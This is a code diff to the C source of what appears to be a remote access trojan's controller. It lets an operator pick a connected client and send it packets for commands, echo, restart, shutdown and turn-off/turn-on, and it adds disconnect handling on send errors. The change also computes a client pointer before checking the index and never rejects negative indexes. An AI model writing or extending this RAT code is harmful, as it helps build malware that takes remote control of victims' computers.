@@ -111,6 +111,8 @@ static int read_ratpacket(ratpacket_t **pp, int *allocated) {
   case RAT_PACKET_DISCONNECT:
   case RAT_PACKET_RESTART:
   case RAT_PACKET_SHUTDOWN:
+  case RAT_PACKET_TURN_OFF:
+  case RAT_PACKET_TURN_ON:
     break;
   case RAT_PACKET_CMD:
   case RAT_PACKET_ECHO:
@@ -132,8 +134,6 @@ static int read_ratpacket(ratpacket_t **pp, int *allocated) {
     } else
       LOG_ERR("read file entry failed");
     break;
-  case RAT_PACKET_TURN_OFF:
-  case RAT_PACKET_TURN_ON:
   default:
     LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op), p->op);
     return 1;
@@ -164,29 +164,30 @@ static void handle_clients(Server *server) {
     }
     fgets(server_buf, sizeof(server_buf), stdin);
     int index = atoi(server_buf);
-    if (index >= MAX_CLIENTS || server->clients[index].conn == INVALID_SOCKET) {
+    SOCKET *client = &server->clients[index].conn;
+    if (index >= MAX_CLIENTS || *client == INVALID_SOCKET) {
       LOG_ERR("client %d doesn't exist", index);
       continue;
     }
-    SOCKET client = server->clients[index].conn;
     if (read_ratpacket(&p, &allocated)) {
       LOG_ERR("read rat packet from user failed");
       continue;
     }
     if (p->op == RAT_PACKET_DISCONNECT) {
-      if (shutdown(client, SD_SEND) == SOCKET_ERROR) {
+      if (shutdown(*client, SD_SEND) == SOCKET_ERROR) {
         LOG_ERR("shutdown failed, error: %d", WSAGetLastError());
       }
-      closesocket(client);
-      server->clients[index].conn = INVALID_SOCKET;
+      close_client(client);
     }
-    if (send(client, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
-      LOG_ERR("send failed with %d", WSAGetLastError());
+    if (send(*client, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
+      LOG_ERR("send rat header failed with %d", WSAGetLastError());
+      close_client(client);
     }
     if (!p->data_len)
       continue;
-    if (send(client, (char *)p->data, p->data_len, 0) == SOCKET_ERROR) {
-      LOG_ERR("send failed with %d", WSAGetLastError());
+    if (send(*client, (char *)p->data, p->data_len, 0) == SOCKET_ERROR) {
+      LOG_ERR("send rat data failed with %d", WSAGetLastError());
+      close_client(client);
     }
     if (!allocated)
       continue;
